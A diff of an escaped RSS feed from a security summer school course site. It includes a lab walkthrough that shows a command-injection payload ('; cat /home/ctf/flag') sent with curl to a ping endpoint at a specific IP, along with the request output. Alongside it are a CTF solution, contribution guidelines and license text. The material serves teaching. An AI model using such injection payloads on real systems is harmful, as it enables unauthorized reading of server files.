+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From here we get the following information:&lt;/p>
 &lt;ul>
-&lt;li>opening &lt;a href="https://github.com/security-summer-school/essentials/issues">issues&lt;/a>&lt;/li>
-&lt;li>taking part in &lt;a href="https://github.com/security-summer-school/essentials/discussions">discussions&lt;/a>&lt;/li>
-&lt;li>creating &lt;a href="https://github.com/security-summer-school/essentials//pulls">pull requests&lt;/a> to update the content&lt;/li>
+&lt;li>upon pressing &amp;ldquo;Submit&amp;rdquo;, a &lt;code>GET&lt;/code> request is sent to &lt;code>/ping&lt;/code>&lt;/li>
+&lt;li>the input we provide is set as the value of the key &lt;code>ip&lt;/code>&lt;/li>
 &lt;/ul>
-&lt;p>Before you make any contribution, make sure it follows the &lt;a href="https://github.com/security-summer-school/meta/blob/master/docs/contributing.md">community guide&lt;/a>.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/copying/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/copying/</guid><description>
+&lt;p>So a request URL that gets the flag would look like this:&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /ping?ip=; cat /home/ctf/flag
+&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try to do this with &lt;code>curl&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v -G -d &amp;#39;ip=; cat /home/ctf/flag&amp;#39; http://141.85.224.70:8069/ping
+* Trying 141.85.224.70:8069...
+* TCP_NODELAY set
+* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)
+&amp;gt; GET /ping?ip=; cat /home/ctf/flag HTTP/1.1
+&amp;gt; Host: 141.85.224.70:8069
+&amp;gt; User-Agent: curl/7.68.0
+&amp;gt; Accept: */*
+&amp;gt;
+* Mark bundle as not supporting multiuse
+&amp;lt; HTTP/1.1 400 Bad Request
+[...]
+&lt;/code>&lt;/pre>&lt;p>Why does the request fail?
+Look at the request:&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /ping?ip=; cat /home/ctf/flag HTTP/1.1
+&lt;/code>&lt;/pre>&lt;p>The value of the query parameter &lt;code>ip&lt;/code> contains some forbidden characters: &lt;code>;&lt;/code>, &lt;code>/&lt;/code> and space.
+We need to send them encoded for URLs.
+For this we use the &lt;code>--data-urlencode&lt;/code> parameter for &lt;code>curl&lt;/code>:&lt;/p>
+&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v -G --data-urlencode &amp;#39;ip=; cat /home/ctf/flag&amp;#39; http://141.85.224.70:8069/ping
+* Trying 141.85.224.70:8069...
+* TCP_NODELAY set
+* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)
+&amp;gt; GET /ping?ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag HTTP/1.1
+&amp;gt; Host: 141.85.224.70:8069
+&amp;gt; User-Agent: curl/7.68.0
+&amp;gt; Accept: */*
+&amp;gt;
+* Mark bundle as not supporting multiuse
+&amp;lt; HTTP/1.1 200 OK
+[...]
+&lt;/code>&lt;/pre></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/rediscovering-the-browser/drills/readme/sol/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/rediscovering-the-browser/drills/readme/sol/readme/</guid><description>
+&lt;h1 id="name-readme">Name: Readme&lt;/h1>
+&lt;h2 id="vulnerability">Vulnerability&lt;/h2>
+&lt;p>The flag is showing up in the URL after clicking on the hyperlink.&lt;/p>
+&lt;h2 id="exploit">Exploit&lt;/h2>
+&lt;p>The website tells you ti click a hyperlink.
+Do it and then look at the address bar.
+Notice the query parameter &lt;code>flag=&amp;lt;flag value&amp;gt;&lt;/code>.
+Flags can be hidden anywhere.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/chapters/demystifying-web/rediscovering-the-browser/slides/rediscovering-the-browser/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/demystifying-web/rediscovering-the-browser/slides/rediscovering-the-browser/</guid><description>
+&lt;h1 id="rediscovering-the-browser">Rediscovering the Browser&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/scratch-linux/overview/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/scratch-linux/overview/readme/</guid><description>
+&lt;h1 id="scratch-linux">Scratch Linux&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/scratch-linux/overview/slides/scratch-linux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/scratch-linux/overview/slides/scratch-linux/</guid><description>
+&lt;h1 id="scratch-linux">Scratch Linux&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/scratch-linux/system-exploration/slides/system-exploration/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/scratch-linux/system-exploration/slides/system-exploration/</guid><description>
+&lt;h1 id="system-exploration">System Exploration&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/chapters/scratch-linux/welcome-to-linux/slides/welcome-to-linux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/chapters/scratch-linux/welcome-to-linux/slides/welcome-to-linux/</guid><description>
+&lt;h1 id="welcome-to-linux">Welcome to Linux&lt;/h1></description></item><item><title>Essentials:</title><link>/essentials/contributing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/contributing/</guid><description>
+&lt;h1 id="contributing-to-essentials-security-resources">Contributing to Essentials Security Resources&lt;/h1>
+&lt;p>These are recommendations when contributing to the contents of the Essentials Security repository.
+They consider contributions to both actual content (mostly Markdown) and support code made via Git.&lt;/p>
+&lt;h2 id="first-steps">First Steps&lt;/h2>
+&lt;p>Some good first steps and best practices when using Git are explained here:&lt;/p>
+&lt;ul>
+&lt;li>the Git Immersion tutorial: &lt;a href="https://gitimmersion.com/">https://gitimmersion.com/&lt;/a>&lt;/li>
+&lt;li>the Atlassian tutorial: &lt;a href="https://www.atlassian.com/git/tutorials/learn-git-with-bitbucket-cloud">https://www.atlassian.com/git/tutorials/learn-git-with-bitbucket-cloud&lt;/a>&lt;/li>
+&lt;li>this blog post on the &lt;code>ROSEdu Techblog&lt;/code>: &lt;a href="https://techblog.rosedu.org/git-good-practices.html">https://techblog.rosedu.org/git-good-practices.html&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="language">Language&lt;/h2>
+&lt;p>All of our content is developed in English.
+This means we use English for content, support code, commit messages, pull requests, issues, comments, everything.&lt;/p>
+&lt;h2 id="content-writing-style">Content Writing Style&lt;/h2>
+&lt;p>This section addresses the development of session content and other Markdown files.&lt;/p>
+&lt;p>Write each sentence on a new line.
+This way, changing one sentence only affects one line in the source code.&lt;/p>
+&lt;p>Use the &lt;strong>first person plural&lt;/strong> when writing documentation and tutorials.
+Use phrases like &amp;ldquo;we run the command / app&amp;rdquo;, &amp;ldquo;we look at the source code&amp;rdquo;, &amp;ldquo;we find the flag&amp;rdquo;.&lt;/p>
+&lt;p>Use the second person for challenges and other individual activities.
+Use phrases like &amp;ldquo;find the flag&amp;rdquo;, &amp;ldquo;run this command&amp;rdquo;, &amp;ldquo;download the tool&amp;rdquo;.&lt;/p>
+&lt;h2 id="images">Images&lt;/h2>
+&lt;p>Use &lt;a href="https://app.diagrams.net/">draw.io&lt;/a> to create diagrams.
+If using external images / diagram, make sure they use a CC BY-SA license and give credits (mention author and / or add link to the image source).&lt;/p>
+&lt;h2 id="slides">Slides&lt;/h2>
+&lt;p>Slides are to be written in Markdown, using &lt;a href="https://github.com/webpro/reveal-md">&lt;code>reveal-md&lt;/code>&lt;/a>, itself based on &lt;a href="https://revealjs.com/">&lt;code>reveal-js&lt;/code>&lt;/a>.
+Use &lt;code>reveal-md&lt;/code> and &lt;code>reveal-js&lt;/code> specifics to split information in slides.
+Aim to make slides attractive, sleek and simple to follow.&lt;/p>
+&lt;p>Images and diagrams would ideally be animated on slides.
+Aim to use &lt;code>reveal.js&lt;/code> features to animate drawing of diagrams.&lt;/p>
+&lt;p>If &lt;code>reveal.js&lt;/code> drawing is difficult, use &lt;a href="https://app.diagrams.net/">draw.io&lt;/a> to create diagrams.
+Ideally you would &amp;ldquo;animate&amp;rdquo; those diagrams by creating multiple incremental versions of the diagram and adding each to a slide;
+when browsing slides pieces of these diagrams will &amp;ldquo;appear&amp;rdquo; and complete the final image, rendering an animation-like effect.&lt;/p>
+&lt;h2 id="issues">Issues&lt;/h2>
+&lt;p>When opening an issue, please clearly state the problem.
+Make sure it&amp;rsquo;s reproducible.
+Add images if required.
+Also, if relevant, detail the environment you used (OS, software versions).
+Ideally, if the issue is something you could fix, open a pull request with the fix.&lt;/p>
+&lt;h2 id="discussions">Discussions&lt;/h2>
+&lt;p>Use GitHub discussions for bringing up ideas on content, new chapters, new sections.
+Provide support to others asking questions and take part in suggestions brought by others.
+Please be civil when taking part in discussions.&lt;/p>
+&lt;h2 id="pull-requests">Pull Requests&lt;/h2>
+&lt;p>For pull requests, please follow the &lt;a href="https://docs.github.com/en/github/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork">GitHub flow&lt;/a>: create a fork of the repository, create your own branch, do commits, push changes to your branch, do a pull request (PR).
+The destination branch of pull requests is the default &lt;code>master&lt;/code> branch.&lt;/p>
+&lt;p>Make sure each commit corresponds to &lt;strong>one&lt;/strong> code / content change only.
+If there are multiple commits belonging to a given change, please squash the commits.&lt;/p>
+&lt;p>Also make sure one pull request covers only &lt;strong>one&lt;/strong> topic.&lt;/p>
+&lt;h3 id="commits">Commits&lt;/h3>
+&lt;p>Before making a commit, configure your name and email locally using:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>git config --global user.name &lt;span style="color:#4e9a06">&amp;#34;Your Name&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git config --global user.email &lt;span style="color:#4e9a06">&amp;#34;your.email@example.com&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then make sure the email you&amp;rsquo;ve just configured corresponds to the one you have &lt;a href="https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-email-preferences/adding-an-email-address-to-your-github-account">set on GitHub&lt;/a>.&lt;/p>
+&lt;p>After this, make your changes, &lt;code>git add&lt;/code> them and then commit them using &lt;code>git commit -s&lt;/code>.
+Always sign your commits using the &lt;code>-s&lt;/code> / &lt;code>--signoff&lt;/code> arguments to &lt;code>git commit&lt;/code>.
+This will add the following line at the end of the commit message:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>Signed-off-by: Your Name &amp;lt;your.email@example.com&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that the details above are the name and email that you configured earlier.&lt;/p>
+&lt;p>Now the &lt;code>git commit&lt;/code> command will open your default editor and ask you to write a commit message.
+Prefix each commit message name with the chapter and content type it belongs to, e.g. &lt;code>TODO-chapter/reading&lt;/code>, &lt;code>TODO-chapter/slides&lt;/code>, &lt;code>TODO-chapter/drills&lt;/code>.
+Following the prefix, write a short and expressive title on the first line.
+Use commit messages with verbs at imperative mood: &amp;ldquo;Add README&amp;rdquo;, &amp;ldquo;Update contents&amp;rdquo;, &amp;ldquo;Introduce feature&amp;rdquo;.&lt;/p>
+&lt;p>Leave an empty line, then add a relevant description of the changes made in that commit.
+This description should include why that change is needed (fixes a bug, improves something that was inefficient, etc.).
+Wrap the lines of this description to 75 characters.
+How a good commit message should look like: &lt;a href="https://cbea.ms/git-commit/">https://cbea.ms/git-commit/&lt;/a>
+Below is an example of a good commit message:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>template-chapter/drills: Fix Makefile `CFLAGS` error
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>`CFLAGS` was incorrectly set to optimise the code to the `-O3` level. This
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>caused the function `vulnerable_func()` to be inlined into the caller
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>`main()`, making it impossible to overwrite `main()`&amp;#39;s return address with
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>that of `vulnerable_func()`. This commit fixes the issue by forcing the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>compiler to not optimise the code by replacing `-O3` with `-O0` in `CFLAGS`
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Signed-off-by: Your Name &amp;lt;your.name@example.com&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Essentials:</title><link>/essentials/copying/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/copying/</guid><description>
 &lt;h1 id="license">License&lt;/h1>
-&lt;p>This repository is organized into actual content (in the &lt;code>README.md&lt;/code> file of each session) and support code (in the &lt;code>activities/&lt;/code> subfolder of each session).
-Repository content is licensed under the &lt;a href="https://creativecommons.org/licenses/by-sa/4.0/">Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) license&lt;/a>.
+&lt;p>The content of this repository is dual-licensed.
+Reading content and slides are licensed under the &lt;a href="https://creativecommons.org/licenses/by-sa/4.0/">Attribution-ShareAlike 4.0 International (CC BY-SA 4.0) license&lt;/a>.
 Support code is licensed under the &lt;a href="https://opensource.org/licenses/BSD-3-Clause">3-Clause BSD license&lt;/a> (SPDX short identifier: BSD-3-Clause).
 A copy of each license is below.&lt;/p>
 &lt;p>Copy of CC BY-SA 4.0:&lt;/p>
-&lt;pre tabindex="0">&lt;code>Attribution-NonCommercial-ShareAlike 4.0 International
-=======================================================================
-Creative Commons Corporation (&amp;#34;Creative Commons&amp;#34;) is not a law firm and
-does not provide legal services or legal advice. Distribution of
-Creative Commons public licenses does not create a lawyer-client or
-other relationship. Creative Commons makes its licenses and related
-information available on an &amp;#34;as-is&amp;#34; basis. Creative Commons gives no
-warranties regarding its licenses, any material licensed under their
-terms and conditions, or any related information. Creative Commons
-disclaims all liability for damages resulting from their use to the
-fullest extent possible.
-Using Creative Commons Public Licenses
-Creative Commons public licenses provide a standard set of terms and
-conditions that creators and other rights holders may use to share
-original works of authorship and other material subject to copyright
-and certain other rights specified in the public license below. The
-following considerations are for informational purposes only, are not
-exhaustive, and do not form part of our licenses.
-Considerations for licensors: Our public licenses are
-intended for use by those authorized to give the public
-permission to use material in ways otherwise restricted by
-copyright and certain other rights. Our licenses are
-irrevocable. Licensors should read and understand the terms
-and conditions of the license they choose before applying it.
-Licensors should also secure all rights necessary before
-applying our licenses so that the public can reuse the
-material as expected. Licensors should clearly mark any
-material not subject to the license. This includes other CC-
-licensed material, or material used under an exception or
-limitation to copyright. More considerations for licensors:
-wiki.creativecommons.org/Considerations_for_licensors
-Considerations for the public: By using one of our public
-licenses, a licensor grants the public permission to use the
-licensed material under specified terms and conditions. If
-the licensor&amp;#39;s permission is not necessary for any reason--for
-example, because of any applicable exception or limitation to
-copyright--then that use is not regulated by the license. Our
-licenses grant only permissions under copyright and certain
-other rights that a licensor has authority to grant. Use of
-the licensed material may still be restricted for other
-reasons, including because others have copyright or other
-rights in the material. A licensor may make special requests,
-such as asking that all changes be marked or described.
-Although not required by our licenses, you are encouraged to
-respect those requests where reasonable. More considerations
-for the public:
-wiki.creativecommons.org/Considerations_for_licensees
-=======================================================================
-Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
-Public License
-By exercising the Licensed Rights (defined below), You accept and agree
-to be bound by the terms and conditions of this Creative Commons
-Attribution-NonCommercial-ShareAlike 4.0 International Public License
-(&amp;#34;Public License&amp;#34;). To the extent this Public License may be
-interpreted as a contract, You are granted the Licensed Rights in
-consideration of Your acceptance of these terms and conditions, and the
-Licensor grants You such rights in consideration of benefits the
-Licensor receives from making the Licensed Material available under
-these terms and conditions.
-Section 1 -- Definitions.
-a. Adapted Material means material subject to Copyright and Similar
-Rights that is derived from or based upon the Licensed Material
-and in which the Licensed Material is translated, altered,
-arranged, transformed, or otherwise modified in a manner requiring
-permission under the Copyright and Similar Rights held by the
-Licensor. For purposes of this Public License, where the Licensed
-Material is a musical work, performance, or sound recording,
-Adapted Material is always produced where the Licensed Material is
-synched in timed relation with a moving image.
-b. Adapter&amp;#39;s License means the license You apply to Your Copyright
-and Similar Rights in Your contributions to Adapted Material in
-accordance with the terms and conditions of this Public License.
-c. BY-NC-SA Compatible License means a license listed at
-creativecommons.org/compatiblelicenses, approved by Creative
-Commons as essentially the equivalent of this Public License.
-d. Copyright and Similar Rights means copyright and/or similar rights
-closely related to copyright including, without limitation,
-performance, broadcast, sound recording, and Sui Generis Database
-Rights, without regard to how the rights are labeled or
-categorized. For purposes of this Public License, the rights
-specified in Section 2(b)(1)-(2) are not Copyright and Similar
-Rights.
-e. Effective Technological Measures means those measures that, in the
-absence of proper authority, may not be circumvented under laws
-fulfilling obligations under Article 11 of the WIPO Copyright
-Treaty adopted on December 20, 1996, and/or similar international
-agreements.
-f. Exceptions and Limitations means fair use, fair dealing, and/or
-any other exception or limitation to Copyright and Similar Rights
-that applies to Your use of the Licensed Material.
-g. License Elements means the license attributes listed in the name
-of a Creative Commons Public License. The License Elements of this
-Public License are Attribution, NonCommercial, and ShareAlike.
-h. Licensed Material means the artistic or literary work, database,
-or other material to which the Licensor applied this Public
-License.
-i. Licensed Rights means the rights granted to You subject to the
-terms and conditions of this Public License, which are limited to
-all Copyright and Similar Rights that apply to Your use of the
-Licensed Material and that the Licensor has authority to license.
-j. Licensor means the individual(s) or entity(ies) granting rights
-under this Public License.
-k. NonCommercial means not primarily intended for or directed towards
-commercial advantage or monetary compensation. For purposes of
-this Public License, the exchange of the Licensed Material for
-other material subject to Copyright and Similar Rights by digital
-file-sharing or similar means is NonCommercial provided there is
-no payment of monetary compensation in connection with the
-exchange.
-l. Share means to provide material to the public by any means or
-process that requires permission under the Licensed Rights, such
-as reproduction, public display, public performance, distribution,
-dissemination, communication, or importation, and to make material
-available to the public including in ways that members of the
-public may access the material from a place and at a time
-individually chosen by them.
-m. Sui Generis Database Rights means rights other than copyright
-resulting from Directive 96/9/EC of the European Parliament and of
-the Council of 11 March 1996 on the legal protection of databases,
-as amended and/or succeeded, as well as other essentially
-equivalent rights anywhere in the world.
-n. You means the individual or entity exercising the Licensed Rights
-under this Public License. Your has a corresponding meaning.
-Section 2 -- Scope.
-a. License grant.
-1. Subject to the terms and conditions of this Public License,
-the Licensor hereby grants You a worldwide, royalty-free,
-non-sublicensable, non-exclusive, irrevocable license to
-exercise the Licensed Rights in the Licensed Material to:
-a. reproduce and Share the Licensed Material, in whole or
-in part, for NonCommercial purposes only; and
-b. produce, reproduce, and Share Adapted Material for
-NonCommercial purposes only.
-2. Exceptions and Limitations. For the avoidance of doubt, where
-Exceptions and Limitations apply to Your use, this Public
-License does not apply, and You do not need to comply with
-its terms and conditions.
-3. Term. The term of this Public License is specified in Section
-6(a).
-4. Media and formats; technical modifications allowed. The
-Licensor authorizes You to exercise the Licensed Rights in
-all media and formats whether now known or hereafter created,
-and to make technical modifications necessary to do so. The
-Licensor waives and/or agrees not to assert any right or
-authority to forbid You from making technical modifications
-necessary to exercise the Licensed Rights, including
-technical modifications necessary to circumvent Effective
-Technological Measures. For purposes of this Public License,
-simply making modifications authorized by this Section 2(a)
-(4) never produces Adapted Material.
-5. Downstream recipients.
-a. Offer from the Licensor -- Licensed Material. Every
-recipient of the Licensed Material automatically
-receives an offer from the Licensor to exercise the
-Licensed Rights under the terms and conditions of this
-Public License.
-b. Additional offer from the Licensor -- Adapted Material.
-Every recipient of Adapted Material from You
-automatically receives an offer from the Licensor to
-exercise the Licensed Rights in the Adapted Material
-under the conditions of the Adapter&amp;#39;s License You apply.
-c. No downstream restrictions. You may not offer or impose
-any additional or different terms or conditions on, or
-apply any Effective Technological Measures to, the
-Licensed Material if doing so restricts exercise of the
-Licensed Rights by any recipient of the Licensed
-Material.
-6. No endorsement. Nothing in this Public License constitutes or
-may be construed as permission to assert or imply that You
-are, or that Your use of the Licensed Material is, connected
-with, or sponsored, endorsed, or granted official status by,
-the Licensor or others designated to receive attribution as
-provided in Section 3(a)(1)(A)(i).
-b. Other rights.
-1. Moral rights, such as the right of integrity, are not
-licensed under this Public License, nor are publicity,
-privacy, and/or other similar personality rights; however, to
-the extent possible, the Licensor waives and/or agrees not to
-assert any such rights held by the Licensor to the limited
-extent necessary to allow You to exercise the Licensed
-Rights, but not otherwise.
-2. Patent and trademark rights are not licensed under this
-Public License.
-3. To the extent possible, the Licensor waives any right to
-collect royalties from You for the exercise of the Licensed
-Rights, whether directly or through a collecting society
-under any voluntary or waivable statutory or compulsory
-licensing scheme. In all other cases the Licensor expressly
-reserves any right to collect such royalties, including when
-the Licensed Material is used other than for NonCommercial
-purposes.
-Section 3 -- License Conditions.
-Your exercise of the Licensed Rights is expressly made subject to the
-following conditions.
-a. Attribution.
-1. If You Share the Licensed Material (including in modified
-form), You must:
-a. retain the following if it is supplied by the Licensor
-with the Licensed Material:
-i. identification of the creator(s) of the Licensed
-Material and any others designated to receive
-attribution, in any reasonable manner requested by
-the Licensor (including by pseudonym if
-designated);
-ii. a copyright notice;
-iii. a notice that refers to this Public License;
-iv. a notice that refers to the disclaimer of
-warranties;
-v. a URI or hyperlink to the Licensed Material to the
-extent reasonably practicable;
-b. indicate if You modified the Licensed Material and
-retain an indication of any previous modifications; and
-c. indicate the Licensed Material is licensed under this
-Public License, and include the text of, or the URI or
-hyperlink to, this Public License.
-2. You may satisfy the conditions in Section 3(a)(1) in any
-reasonable manner based on the medium, means, and context in
-which You Share the Licensed Material. For example, it may be
-reasonable to satisfy the conditions by providing a URI or
-hyperlink to a resource that includes the required
-information.
-3. If requested by the Licensor, You must remove any of the
-information required by Section 3(a)(1)(A) to the extent
-reasonably practicable.
-b. ShareAlike.
-In addition to the conditions in Section 3(a), if You Share
-Adapted Material You produce, the following conditions also apply.
-1. The Adapter&amp;#39;s License You apply must be a Creative Commons
-license with the same License Elements, this version or
-later, or a BY-NC-SA Compatible License.
-2. You must include the text of, or the URI or hyperlink to, the
-Adapter&amp;#39;s License You apply. You may satisfy this condition
-in any reasonable manner based on the medium, means, and
-context in which You Share Adapted Material.
-3. You may not offer or impose any additional or different terms
-or conditions on, or apply any Effective Technological
-Measures to, Adapted Material that restrict exercise of the
-rights granted under the Adapter&amp;#39;s License You apply.
-Section 4 -- Sui Generis Database Rights.
-Where the Licensed Rights include Sui Generis Database Rights that
-apply to Your use of the Licensed Material:
-a. for the avoidance of doubt, Section 2(a)(1) grants You the right
-to extract, reuse, reproduce, and Share all or a substantial
-portion of the contents of the database for NonCommercial purposes
-only;
-b. if You include all or a substantial portion of the database
-contents in a database in which You have Sui Generis Database
-Rights, then the database in which You have Sui Generis Database
-Rights (but not its individual contents) is Adapted Material,
-including for purposes of Section 3(b); and
-c. You must comply with the conditions in Section 3(a) if You Share
-all or a substantial portion of the contents of the database.
-For the avoidance of doubt, this Section 4 supplements and does not
-replace Your obligations under this Public License where the Licensed
-Rights include other Copyright and Similar Rights.
-Section 5 -- Disclaimer of Warranties and Limitation of Liability.
-a. UNLESS OTHERWISE SEPARATELY UNDERTAKEN BY THE LICENSOR, TO THE
-EXTENT POSSIBLE, THE LICENSOR OFFERS THE LICENSED MATERIAL AS-IS
-AND AS-AVAILABLE, AND MAKES NO REPRESENTATIONS OR WARRANTIES OF
-ANY KIND CONCERNING THE LICENSED MATERIAL, WHETHER EXPRESS,
-IMPLIED, STATUTORY, OR OTHER. THIS INCLUDES, WITHOUT LIMITATION,
-WARRANTIES OF TITLE, MERCHANTABILITY, FITNESS FOR A PARTICULAR
-PURPOSE, NON-INFRINGEMENT, ABSENCE OF LATENT OR OTHER DEFECTS,
-ACCURACY, OR THE PRESENCE OR ABSENCE OF ERRORS, WHETHER OR NOT
-KNOWN OR DISCOVERABLE. WHERE DISCLAIMERS OF WARRANTIES ARE NOT
-ALLOWED IN FULL OR IN PART, THIS DISCLAIMER MAY NOT APPLY TO YOU.
-b. TO THE EXTENT POSSIBLE, IN NO EVENT WILL THE LICENSOR BE LIABLE
-TO YOU ON ANY LEGAL THEORY (INCLUDING, WITHOUT LIMITATION,
-NEGLIGENCE) OR OTHERWISE FOR ANY DIRECT, SPECIAL, INDIRECT,
-INCIDENTAL, CONSEQUENTIAL, PUNITIVE, EXEMPLARY, OR OTHER LOSSES,
-COSTS, EXPENSES, OR DAMAGES ARISING OUT OF THIS PUBLIC LICENSE OR
-USE OF THE LICENSED MATERIAL, EVEN IF THE LICENSOR HAS BEEN
-ADVISED OF THE POSSIBILITY OF SUCH LOSSES, COSTS, EXPENSES, OR
-DAMAGES. WHERE A LIMITATION OF LIABILITY IS NOT ALLOWED IN FULL OR
-IN PART, THIS LIMITATION MAY NOT APPLY TO YOU.
-c. The disclaimer of warranties and limitation of liability provided
-above shall be interpreted in a manner that, to the extent
-possible, most closely approximates an absolute disclaimer and
-waiver of all liability.
-Section 6 -- Term and Termination.
-a. This Public License applies for the term of the Copyright and
-Similar Rights licensed here. However, if You fail to comply with
-this Public License, then Your rights under this Public License
-terminate automatically.
-b. Where Your right to use the Licensed Material has terminated under
-Section 6(a), it reinstates:
-1. automatically as of the date the violation is cured, provided
-it is cured within 30 days of Your discovery of the
-violation; or
-2. upon express reinstatement by the Licensor.
-For the avoidance of doubt, this Section 6(b) does not affect any
-right the Licensor may have to seek remedies for Your violations
-of this Public License.
-c. For the avoidance of doubt, the Licensor may also offer the
-Licensed Material under separate terms or conditions or stop
-distributing the Licensed Material at any time; however, doing so
-will not terminate this Public License.
-d. Sections 1, 5, 6, 7, and 8 survive termination of this Public
-License.
-Section 7 -- Other Terms and Conditions.
-a. The Licensor shall not be bound by any additional or different
-terms or conditions communicated by You unless expressly agreed.
-b. Any arrangements, understandings, or agreements regarding the
-Licensed Material not stated herein are separate from and
-independent of the terms and conditions of this Public License.
-Section 8 -- Interpretation.
-a. For the avoidance of doubt, this Public License does not, and
-shall not be interpreted to, reduce, limit, restrict, or impose
-conditions on any use of the Licensed Material that could lawfully
-be made without permission under this Public License.
-b. To the extent possible, if any provision of this Public License is
-deemed unenforceable, it shall be automatically reformed to the
-minimum extent necessary to make it enforceable. If the provision
-cannot be reformed, it shall be severed from this Public License
-without affecting the enforceability of the remaining terms and
-conditions.
-c. No term or condition of this Public License will be waived and no
-failure to comply consented to unless expressly agreed to by the
-Licensor.
-d. Nothing in this Public License constitutes or may be interpreted
-as a limitation upon, or waiver of, any privileges and immunities
-that apply to the Licensor or You, including from the legal
-processes of any jurisdiction or authority.
-=======================================================================
-Creative Commons is not a party to its public
-licenses. Notwithstanding, Creative Commons may elect to apply one of
-its public licenses to material it publishes and in those instances
-will be considered the “Licensor.” The text of the Creative Commons
-public licenses is dedicated to the public domain under the CC0 Public
-Domain Dedication. Except for the limited purpose of indicating that
-material is shared under a Creative Commons public license or as
-otherwise permitted by the Creative Commons policies published at
-creativecommons.org/policies, Creative Commons does not authorize the
-use of the trademark &amp;#34;Creative Commons&amp;#34; or any other trademark or logo
-of Creative Commons without its prior written consent including,
-without limitation, in connection with any unauthorized modifications
-to any of its public licenses or any other arrangements,
-understandings, or agreements concerning use of licensed material. For
-the avoidance of doubt, this paragraph does not form part of the
-public licenses.
-Creative Commons may be contacted at creativecommons.org.
-&lt;/code>&lt;/pre>&lt;p>Copy of BSD-3-Clause:&lt;/p>
-&lt;pre tabindex="0">&lt;code>Copyright 2023 University POLITEHNICA of Bucharest
-Redistribution and use in source and binary forms, with or without
-modification, are permitted provided that the following conditions are met:
-1. Redistributions of source code must retain the above copyright notice, this
-list of conditions and the following disclaimer.
-2. Redistributions in binary form must reproduce the above copyright notice,
-this list of conditions and the following disclaimer in the documentation
-and/or other materials provided with the distribution.
-3. Neither the name of the copyright holder nor the names of its contributors
-may be used to endorse or promote products derived from this software
-without specific prior written permission.
-THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &amp;#34;AS IS&amp;#34; AND
-ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
-WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
-FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
-DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
